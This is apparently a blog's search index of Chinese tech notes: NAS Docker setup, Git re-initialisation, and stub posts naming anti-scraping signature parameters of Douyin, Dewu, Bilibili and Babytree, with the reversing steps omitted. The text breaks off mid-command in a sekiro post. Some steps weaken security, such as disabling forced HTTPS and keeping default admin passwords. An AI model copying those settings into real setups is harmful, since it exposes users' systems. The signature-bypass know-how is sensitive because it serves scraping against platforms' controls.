<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>No126：NAS群晖DS218+使用笔记</title>
      <link href="/posts/7bc3db82.html"/>
      <url>/posts/7bc3db82.html</url>
      
        <content type="html"><![CDATA[<h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><ol><li><a href="https://finds.synology.com/">查找群晖设备</a>，或者使用Synology Asistant</li><li>安装最新版本（DSM 7.2.1-69057 Update 5），可以从<a href="https://www.synology.cn/zh-cn/support/download/DS218+">群晖官网</a>下载好pat文件</li><li>磁盘阵列选择（RAID 1），文件系统选择（Btrfs）</li><li>新建存储池（相当于硬盘），存储空间（相当于硬盘下分区），共享文件夹（相当于分区下文件夹）</li><li>申请<a href="https://www.synology.cn/">群晖账号</a>，设置QuickConect<br><img src="/posts/7bc3db82/%E8%AE%BE%E7%BD%AEQuickConect.jpg" alt="设置QuickConect" title="设置QuickConect"></li><li>固定局域网IP<br><img src="/posts/7bc3db82/%E5%9B%BA%E5%AE%9A%E5%B1%80%E5%9F%9F%E7%BD%91IP.jpg" alt="固定局域网IP" title="固定局域网IP"></li><li>开启SSH<br><img src="/posts/7bc3db82/%E5%BC%80%E5%90%AFSSH.jpg" alt="开启SSH" title="开启SSH"></li><li>开启SFTP<br><img src="/posts/7bc3db82/%E5%BC%80%E5%90%AFSFTP.jpg" alt="开启SFTP" title="开启SFTP"></li><li>关闭强转HTTPS<br><img src="/posts/7bc3db82/%E5%85%B3%E9%97%AD%E5%BC%BA%E8%BD%ACHTTPS.jpg" alt="关闭强转HTTPS" title="关闭强转HTTPS"></li><li>关闭自动更新<br><img src="/posts/7bc3db82/%E5%85%B3%E9%97%AD%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0.jpg" alt="关闭自动更新" title="关闭自动更新"></li></ol><h3 id="套件"><a href="#套件" class="headerlink" title="套件"></a>套件</h3><h4 id="添加套件源"><a href="#添加套件源" class="headerlink" title="添加套件源"></a>添加套件源</h4><p><img src="/posts/7bc3db82/%E5%A5%97%E4%BB%B6%E6%BA%90.jpg" alt="套件源" title="套件源"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">synocommunity</span></span><br><span class="line">https://packages.synocommunity.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cphub</span></span><br><span class="line">https://www.cphub.net</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sysco</span></span><br><span class="line">https://synology.sysco.ch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4sa</span></span><br><span class="line">https://spk.4sag.ru</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">云梦</span></span><br><span class="line">https://spk.520810.xyz:666</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">我不是矿神</span></span><br><span class="line">https://spk7.imnks.com</span><br></pre></td></tr></table></figure><h4 id="删除系统内部用户账号"><a href="#删除系统内部用户账号" class="headerlink" title="删除系统内部用户账号"></a>删除系统内部用户账号</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑系统用户文件</span></span><br><span class="line">vim /etc/passwd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据需要更改文件，保存后重启系统</span></span><br></pre></td></tr></table></figure><h4 id="删除套件卸载后遗留文件"><a href="#删除套件卸载后遗留文件" class="headerlink" title="删除套件卸载后遗留文件"></a>删除套件卸载后遗留文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载套件后会有遗留文件，保存在以下文件夹</span></span><br><span class="line">cd /volume1/@appconf</span><br><span class="line">cd /volume1/@appdata</span><br><span class="line">cd /volume1/@apphome</span><br><span class="line">cd /volume1/@appstore</span><br><span class="line">cd /volume1/@apptemp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据需要删除文件夹</span></span><br><span class="line">rm -rf xxx</span><br></pre></td></tr></table></figure><h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><h4 id="V2Ray"><a href="#V2Ray" class="headerlink" title="V2Ray"></a>V2Ray</h4><ol><li>Docker注册表搜索下载镜像（mzz2017&#x2F;v2raya:latest）</li><li>映射端口：2017&#x3D;2017，20170&#x3D;20170，20171&#x3D;20171</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;v2raya&#x3D;&#x2F;etc&#x2F;v2raya</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai，V2RAYA_LOG_FILE&#x3D;&#x2F;tmp&#x2F;v2raya.log</li><li>网络：bridge</li></ol><h4 id="Clash"><a href="#Clash" class="headerlink" title="Clash"></a>Clash</h4><ul><li>准备Clash配置文件，订阅信息自行获取</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基础信息</span></span><br><span class="line">mixed-port: 7890</span><br><span class="line">socks-port: 7898</span><br><span class="line">port: 7899</span><br><span class="line">log-level: info</span><br><span class="line">allow-lan: true</span><br><span class="line">mode: rule</span><br><span class="line">external-controller: 0.0.0.0:9090</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">订阅信息</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><ol><li>Docker注册表搜索下载镜像（dreamacro&#x2F;clash:latest）</li><li>映射端口：7890&#x3D;7890，9090&#x3D;9090</li><li>映射文件：&#x2F;docker&#x2F;clash&#x2F;config.yaml&#x3D;&#x2F;root&#x2F;.config&#x2F;clash&#x2F;config.yaml</li><li>映射文件夹：无</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai</li><li>权限：高</li><li>网络：bridge</li><li>命令：无</li></ol><ul><li><a href="http://yacd.haishan.me/">在线UI界面</a></li></ul><ol><li>Docker注册表搜索下载镜像（haishanh&#x2F;yacd:latest）</li><li>映射端口：9099&#x3D;80</li><li>映射文件：无</li><li>映射文件夹：无</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai</li><li>权限：高</li><li>网络：bridge</li><li>命令：无</li></ol><ul><li>访问<a href="http://nas_ip:9099/">http://NAS_IP:9099</a></li></ul><h3 id="组网穿透"><a href="#组网穿透" class="headerlink" title="组网穿透"></a>组网穿透</h3><h4 id="节点小宝"><a href="#节点小宝" class="headerlink" title="节点小宝"></a>节点小宝</h4><ol><li>Docker注册表搜索下载镜像（ionewu&#x2F;owjdxb:latest）</li><li>映射端口：无</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;owjdxb&#x2F;store&#x3D;&#x2F;data&#x2F;store</li><li>环境变量：无</li><li>权限：高</li><li>网络：host</li><li>命令：无</li></ol><h4 id="星空组网"><a href="#星空组网" class="headerlink" title="星空组网"></a>星空组网</h4><ol><li><a href="https://doc.starvpn.cn/#/docker">官网</a>下载镜像</li><li>映射端口：无</li><li>映射文件：无</li><li>映射文件夹：无</li><li>环境变量：STARS_USER&#x3D;成员账号，STARS_PASS&#x3D;成员密码</li><li>权限：高</li><li>网络：host</li><li>命令：无</li></ol><h4 id="DDNSTO"><a href="#DDNSTO" class="headerlink" title="DDNSTO"></a>DDNSTO</h4><ol><li>Docker注册表搜索下载镜像（linkease&#x2F;ddnsto:latest）</li><li>映射端口：无</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;ddnsto&#x2F;config&#x3D;&#x2F;ddnsto-config</li><li>环境变量：PUID&#x3D;0，PGID&#x3D;0，TOKEN&#x3D;官网TOKEN</li><li>权限：高</li><li>网络：host</li><li>命令：无</li></ol><h4 id="ZeroNews"><a href="#ZeroNews" class="headerlink" title="ZeroNews"></a>ZeroNews</h4><ol><li>Docker注册表搜索下载镜像（zeronews&#x2F;zeronews:latest）</li><li>映射端口：无</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;zeronews&#x3D;&#x2F;etc&#x2F;zeronews</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai，TOKEN&#x3D;官网TOKEN</li><li>权限：高</li><li>网络：host</li><li>命令：无</li></ol><h3 id="Bitwarden"><a href="#Bitwarden" class="headerlink" title="Bitwarden"></a>Bitwarden</h3><ol><li>Docker注册表搜索下载镜像（vaultwarden&#x2F;server:latest）</li><li>映射端口：30123&#x3D;80</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;bitwarden&#x2F;data&#x3D;&#x2F;data</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai，ADMIN_TOKEN&#x3D;管理员代码</li><li>权限：高</li><li>网络：bridge</li><li>命令：无</li></ol><h3 id="aliyundrive-webdav"><a href="#aliyundrive-webdav" class="headerlink" title="aliyundrive-webdav"></a>aliyundrive-webdav</h3><ol><li>Docker注册表搜索下载镜像（messense&#x2F;aliyundrive-webdav:latest）</li><li>映射端口：18080&#x3D;8080</li><li>映射文件：无</li><li>映射文件夹：无</li><li>环境变量：REFRESH_TOKEN&#x3D;token，WEBDAV_AUTH_USER&#x3D;admin，WEBDAV_AUTH_PASSWORD&#x3D;admin</li><li>权限：高</li><li>网络：bridge</li><li>命令：无</li></ol><ul><li>aliyundrive-webdav <a href="https://github.com/messense/aliyundrive-webdav">aliyundrive-webdav refresh token 获取</a>：<a href="https://messense-aliyundrive-webdav-backendrefresh-token-ucs0wn.streamlit.app/">https://messense-aliyundrive-webdav-backendrefresh-token-ucs0wn.streamlit.app</a></li></ul><h3 id="Memos"><a href="#Memos" class="headerlink" title="Memos"></a>Memos</h3><ol><li>Docker注册表搜索下载镜像（neosmemo&#x2F;memos:latest）</li><li>映射端口：5230&#x3D;5230</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;memos&#x3D;&#x2F;var&#x2F;opt&#x2F;memos</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai</li><li>权限：高</li><li>网络：bridge</li><li>命令：无</li></ol><h3 id="Jellyfin"><a href="#Jellyfin" class="headerlink" title="Jellyfin"></a>Jellyfin</h3><ol><li>Docker注册表搜索下载镜像（jellyfin&#x2F;jellyfin:10.9.7）</li><li>映射端口：无</li><li>映射文件：无</li><li>映射文件夹：&#x2F;docker&#x2F;jellyfin&#x2F;config&#x3D;&#x2F;config，&#x2F;docker&#x2F;jellyfin&#x2F;cache&#x3D;&#x2F;cache，&#x2F;video&#x3D;&#x2F;video</li><li>环境变量：TZ&#x3D;Asia&#x2F;Shanghai</li><li>权限：高</li><li>网络：host</li><li>命令：无</li></ol><ul><li><p>MetaShark <a href="https://github.com/cxfksword/jellyfin-plugin-metashark">刮削豆瓣插件</a>：<a href="https://mirror.ghproxy.com/https://github.com/cxfksword/jellyfin-plugin-metashark/releases/download/manifest/manifest_cn.json">https://mirror.ghproxy.com/https://github.com/cxfksword/jellyfin-plugin-metashark/releases/download/manifest/manifest_cn.json</a></p></li><li><p>MetaTube <a href="https://github.com/metatube-community/jellyfin-plugin-metatube">小姐姐插件</a>：<a href="https://cdn.jsdelivr.net/gh/metatube-community/jellyfin-plugin-metatube@dist/manifest.json">https://cdn.jsdelivr.net/gh/metatube-community/jellyfin-plugin-metatube@dist/manifest.json</a></p></li><li><p>媒体封面显示方块的解决方法</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过终端进入容器</span></span><br><span class="line">docker exec -it jellyfin /bin/bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件包</span></span><br><span class="line">apt update</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装字体</span></span><br><span class="line">apt install -y fonts-noto-cjk-extra</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启容器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除方块封面</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描媒体库</span></span><br></pre></td></tr></table></figure><ul><li><p>字幕显示方块的解决方法</p><ol><li>下载喜欢的字体文件，ttf格式，Windows系统可从（C:\Windows\Fonts）复制</li><li>上传至群晖指定文件夹</li><li>Jellyfin启用备用字体<br><img src="/posts/7bc3db82/Jellyfin%E5%90%AF%E7%94%A8%E5%A4%87%E7%94%A8%E5%AD%97%E4%BD%93.jpg" alt="Jellyfin启用备用字体" title="Jellyfin启用备用字体"></li><li>重启群晖</li></ol></li><li><p>刮削失败的解决方法</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑hosts文件</span></span><br><span class="line">vim /etc/hosts</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加以下内容</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">www.themoviedb.org</span></span><br><span class="line">54.192.151.79 www.themoviedb.org</span><br><span class="line">108.139.59.8 www.themoviedb.org</span><br><span class="line">108.139.59.26 www.themoviedb.org</span><br><span class="line">108.139.59.81 www.themoviedb.org</span><br><span class="line">108.139.59.109 www.themoviedb.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">api.tmdb.org</span></span><br><span class="line">18.66.102.20 api.tmdb.org</span><br><span class="line">18.66.102.56 api.tmdb.org</span><br><span class="line">18.66.102.75 api.tmdb.org</span><br><span class="line">18.66.102.107 api.tmdb.org</span><br><span class="line">52.222.144.21 api.tmdb.org</span><br><span class="line">52.222.144.63 api.tmdb.org</span><br><span class="line">52.222.144.96 api.tmdb.org</span><br><span class="line">52.222.144.120 api.tmdb.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">api.thetvdb.com</span></span><br><span class="line">3.160.72.100 api.thetvdb.com</span><br><span class="line">13.35.161.120 api.thetvdb.com</span><br><span class="line">13.225.89.239 api.thetvdb.com</span><br><span class="line">13.249.175.212 api.thetvdb.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">image.tmdb.org</span></span><br><span class="line">143.244.50.88 image.tmdb.org</span><br><span class="line">143.244.50.89 image.tmdb.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">api.themoviedb.org</span></span><br><span class="line">13.35.7.102 api.themoviedb.org</span><br><span class="line">13.35.67.86 api.themoviedb.org</span><br><span class="line">13.35.169.17 api.themoviedb.org</span><br><span class="line">13.35.169.94 api.themoviedb.org</span><br><span class="line">13.35.169.119 api.themoviedb.org</span><br><span class="line">13.35.169.128 api.themoviedb.org</span><br><span class="line">13.224.161.90 api.themoviedb.org</span><br><span class="line">13.225.41.40 api.themoviedb.org</span><br><span class="line">13.225.103.26 api.themoviedb.org</span><br><span class="line">13.225.103.110 api.themoviedb.org</span><br><span class="line">13.226.191.85 api.themoviedb.org</span><br><span class="line">13.226.238.76 api.themoviedb.org</span><br><span class="line">13.226.251.88 api.themoviedb.org</span><br><span class="line">52.85.79.89 api.themoviedb.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">github.com</span></span><br><span class="line">140.82.114.4 github.com</span><br><span class="line">20.205.243.166 github.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">raw.github.com</span></span><br><span class="line">185.199.108.133 raw.github.com</span><br><span class="line">185.199.109.133 raw.github.com</span><br><span class="line">185.199.110.133 raw.github.com</span><br><span class="line">185.199.111.133 raw.github.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">raw.githubusercontent.com</span></span><br><span class="line">185.199.108.133 raw.githubusercontent.com</span><br><span class="line">185.199.109.133 raw.githubusercontent.com</span><br><span class="line">185.199.110.133 raw.githubusercontent.com</span><br><span class="line">185.199.111.133 raw.githubusercontent.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="迅雷"><a href="#迅雷" class="headerlink" title="迅雷"></a>迅雷</h3><ol><li>套件中心搜索安装</li><li>内测邀请码：W67WUQSN</li></ol><h3 id="qBittorrent"><a href="#qBittorrent" class="headerlink" title="qBittorrent"></a>qBittorrent</h3><ol><li>套件中心搜索安装</li><li>默认用户名：admin，密码：adminadmin</li><li>qb设置<br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AE%E8%A1%8C%E4%B8%BA.jpg" alt="qb设置行为" title="qb设置行为"><br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AE%E4%B8%8B%E8%BD%BD.jpg" alt="qb设置下载" title="qb设置下载"><br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AE%E8%BF%9E%E6%8E%A5.jpg" alt="qb设置连接" title="qb设置连接"><br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AE%E9%80%9F%E5%BA%A6.jpg" alt="qb设置速度" title="qb设置速度"><br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AEBitTorrent.jpg" alt="qb设置BitTorrent" title="qb设置BitTorrent"><br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AEWebUI.jpg" alt="qb设置WebUI" title="qb设置WebUI"><br><img src="/posts/7bc3db82/qb%E8%AE%BE%E7%BD%AE%E9%AB%98%E7%BA%A7.jpg" alt="qb设置高级" title="qb设置高级"></li><li>启用Jackett插件，在搜索插件中安装Jackett的url，但不做任何修改会提示API错误</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开Jackett首页，复制右上角的API密钥</span></span><br><span class="line">vim /volume1/@appdata/qBittorrent/qBittorrent_conf/data/nova3/engines/jackett.json</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换api_key</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换url为NAS_IP:9117</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存退出</span></span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="实用命令"><a href="#实用命令" class="headerlink" title="实用命令"></a>实用命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看现有存储池</span></span><br><span class="line">synospace --meta -e</span><br></pre></td></tr></table></figure><h4 id="查找占用带宽最大的进程，Docker注册表搜索下载镜像（janten-iftop-latest）"><a href="#查找占用带宽最大的进程，Docker注册表搜索下载镜像（janten-iftop-latest）" class="headerlink" title="查找占用带宽最大的进程，Docker注册表搜索下载镜像（janten&#x2F;iftop:latest）"></a>查找占用带宽最大的进程，Docker注册表搜索下载镜像（janten&#x2F;iftop:latest）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个镜像为我们提供了iftop命令</span></span><br><span class="line">docker run -it --rm --net host janten/iftop -P -i eth0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用netstat定位进程</span></span><br><span class="line">netstat -pantu | grep [port]</span><br></pre></td></tr></table></figure><h4 id="调用核显创建Docker容器"><a href="#调用核显创建Docker容器" class="headerlink" title="调用核显创建Docker容器"></a>调用核显创建Docker容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断群晖是否有核显驱动，出现card0、renderD128才算成功</span></span><br><span class="line">ls -la /dev/dri</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给所有用户给予文件可执行权限</span></span><br><span class="line">chmod a+x /dev/dri</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建容器</span></span><br><span class="line">docker create --name=emby --device /dev/dri:/dev/dri lovechen/embyserver:latest</span><br></pre></td></tr></table></figure><h4 id="利用nginx反向代理群晖内网服务使用QuickConnect访问，以Jellyfin为例"><a href="#利用nginx反向代理群晖内网服务使用QuickConnect访问，以Jellyfin为例" class="headerlink" title="利用nginx反向代理群晖内网服务使用QuickConnect访问，以Jellyfin为例"></a>利用nginx反向代理群晖内网服务使用QuickConnect访问，以Jellyfin为例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取root权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nginx配置目录</span></span><br><span class="line">cd /etc/nginx/conf.d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建配置文件</span></span><br><span class="line">vim dsm.jellyfin.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">填入以下内容保存</span></span><br><span class="line">location ^~ /jellyfin &#123;</span><br><span class="line">  proxy_pass http://127.0.0.1:8096$request_uri;</span><br><span class="line">  proxy_redirect off;</span><br><span class="line">  proxy_set_header Host $host;</span><br><span class="line">  proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试配置文件</span></span><br><span class="line">nginx -t</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载配置文件</span></span><br><span class="line">nginx -s reload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Jellyfin设置基础url为/jellyfin，重启系统</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NAS </tag>
            
            <tag> 群晖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No125：Git仓库初始化</title>
      <link href="/posts/6bc6db42.html"/>
      <url>/posts/6bc6db42.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>创建远程仓库，获取远程仓库地址</p></li><li><p>进入已有仓库根目录，删除.git文件夹</p></li><li><p>初始化仓库</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><ul><li>添加文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><ul><li>提交文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;init commit&quot;</span><br></pre></td></tr></table></figure><ul><li>配置远端仓库</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add github https://github.com/guoxianru/pages_blog.git</span><br></pre></td></tr></table></figure><ul><li>推送(强制)到远程仓库</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -f origin &quot;master&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No124：抖音、douyin、signature、ac_signature、X-Bogus、a_bogus</title>
      <link href="/posts/35a10144.html"/>
      <url>/posts/35a10144.html</url>
      
        <content type="html"><![CDATA[<ul><li>目标URL</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly92ZXJpZnkuc25zc2RrLmNvbS9jYXB0Y2hhL3ZlcmlmeQ==</span><br><span class="line">aHR0cHM6Ly93d3cuZG91eWluLmNvbS9hd2VtZS92MS93ZWIvdXNlci9wcm9maWxlL290aGVyLw==</span><br></pre></td></tr></table></figure><ul><li>目标参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signature、ac_signature、X-Bogus、a_bogus、captchaBody</span><br></pre></td></tr></table></figure><ul><li>逆向过程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure><ul><li>结果验证</li></ul><p><img src="/posts/35a10144/%E7%BB%93%E6%9E%9C%E9%AA%8C%E8%AF%811.jpg" alt="结果验证1" title="结果验证1"><br><img src="/posts/35a10144/%E7%BB%93%E6%9E%9C%E9%AA%8C%E8%AF%812.jpg" alt="结果验证2" title="结果验证2"></p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> JS逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No123：得物、dewu、newSign</title>
      <link href="/posts/630217ad.html"/>
      <url>/posts/630217ad.html</url>
      
        <content type="html"><![CDATA[<ul><li>目标URL</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly9hcHAuZGV3dS5jb20vYXBpL3YxL2FwcC9jb21tb2RpdHkvaWNlL2JvdXRpcXVlLXJlY29tbWVuZC9kZXRhaWw=</span><br></pre></td></tr></table></figure><ul><li>目标参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newSign</span><br></pre></td></tr></table></figure><ul><li>逆向过程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure><ul><li>结果验证</li></ul><p><img src="/posts/630217ad/%E7%BB%93%E6%9E%9C%E9%AA%8C%E8%AF%81.jpg" alt="结果验证" title="结果验证"></p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Android逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No122：哔哩哔哩、bilibili、w_rid、qv_id</title>
      <link href="/posts/5341eae6.html"/>
      <url>/posts/5341eae6.html</url>
      
        <content type="html"><![CDATA[<ul><li>目标URL</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Imh0dHBzOi8vYXBpLmJpbGliaWxpLmNvbS94L3dlYi1pbnRlcmZhY2Uvd2JpL3NlYXJjaC90eXBlIg==</span><br></pre></td></tr></table></figure><ul><li>目标参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w_rid、qv_id</span><br></pre></td></tr></table></figure><ul><li>逆向过程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure><ul><li>结果验证</li></ul><p><img src="/posts/5341eae6/%E7%BB%93%E6%9E%9C%E9%AA%8C%E8%AF%81.jpg" alt="结果验证" title="结果验证"></p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> JS逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No121：宝宝树、babytree、secret、signature</title>
      <link href="/posts/762f934c.html"/>
      <url>/posts/762f934c.html</url>
      
        <content type="html"><![CDATA[<ul><li>目标URL</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cDovL2dvLmJhYnl0cmVlLmNvbS9nb19hc2svYXBpL3F1ZXN0aW9uL2RldGFpbA==</span><br></pre></td></tr></table></figure><ul><li>目标参数</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret、signature</span><br></pre></td></tr></table></figure><ul><li>逆向过程</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure><ul><li>结果验证</li></ul><p><img src="/posts/762f934c/%E7%BB%93%E6%9E%9C%E9%AA%8C%E8%AF%81.jpg" alt="结果验证" title="结果验证"></p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Android逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No120：部署sekiro并升级为HTTPS</title>
      <link href="/posts/fcd35d35.html"/>
      <url>/posts/fcd35d35.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、版本选择及部署"><a href="#一、版本选择及部署" class="headerlink" title="一、版本选择及部署"></a>一、版本选择及部署</h3><p><a href="https://sekiro.iinti.cn/sekiro-doc/">sekiro官方文档</a></p><p>第一代sekiro从2019年开发，自2021年4月终止开发，由于早期代码有太多底层架构方面的问题。故2021年进行了彻底的重构，并且本次重构试一次完全不兼容的重构。</p><p>我们建议使用2020(含)以前的版本的同学，尽快升级到新版。同时sekiro也关闭了老版本的docker自动构建通道。</p><ul><li>Sekiro服务端（旧版），服务器开放端口：5600-5603</li></ul><p><a href="https://github.com/virjar/sekiro/tree/a9b115709fbae88889a123e07fc09624d57ebe43">旧版</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装docker</span></span><br><span class="line">docker run --restart=always -d -p 5600:5600 -p 5601:5601 -p 5602:5602 -p 5603:5603 --name sekiro-server 